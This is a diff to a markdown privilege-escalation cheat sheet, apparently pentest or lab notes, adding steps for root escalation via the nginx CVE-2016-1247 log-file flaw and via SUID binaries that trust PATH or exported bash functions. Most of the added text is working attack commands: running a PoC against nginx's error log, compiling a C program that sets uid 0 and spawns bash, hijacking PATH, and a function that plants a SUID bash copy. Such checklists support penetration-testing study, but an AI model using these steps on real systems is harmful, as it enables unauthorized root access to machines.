@@ -237,7 +237,55 @@
   7. Run the orignal binary that makes the call
   8. ROOT!
   
-  
+### Binary Symlinks in nGinx with CVE-2016-1247
+  1. Check the version of nginx of 1.6.2 or earlier
+  ```bash
+  dpkg -l | grep nginx
+  ```
+  2. verify that the SUID bit is set on sudo
+  ```bash
+  find / -type f -perm -04000 -ls 2>/dev/null
+  ```
+  3. Run the Linux Exploit Suggester
+  4. Find CVE-2016-1247
+  5. Check the nginx log files for rwx in the folder
+  ```bash
+  ls -la /var/log/nginx
+  ```
+  6. Run the PoC
+  ```bash
+  ./nginxed-root.sh /var/log/nginx/error.log
+  ```
+  7. Generate a log event
+  8. ROOT!
+ 
+ ### Environmental Variables
+  1. Check the SUIDs
+  ```bash
+  find / -type f -perm -04000 -ls 2>/dev/null
+  ```
+  2. run the binary and check the strings, if it only calls the service continue, if it calls the full path skip to 6
+  ```bash
+  strings <path/to/binary>
+  ```
+  3. Check the path variable
+  ```bash
+  print $PATH
+  ```
+  4. create a malicious C file and compile it
+  ```c
+  echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+  gcc /tmp/service.c -o /tmp/service
+  ```
+  5. Change the PATH variable
+  ```bash
+  export PATH=/tmp:$PATH
+  ```
+  6. create a malicious function
+  ```bash
+  function <path to binary>() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+  export -f <path to binary>
+  ```
 ## Escalation via Scheduled Tasks
 ### Check writeable Files and Directories
 ```bash
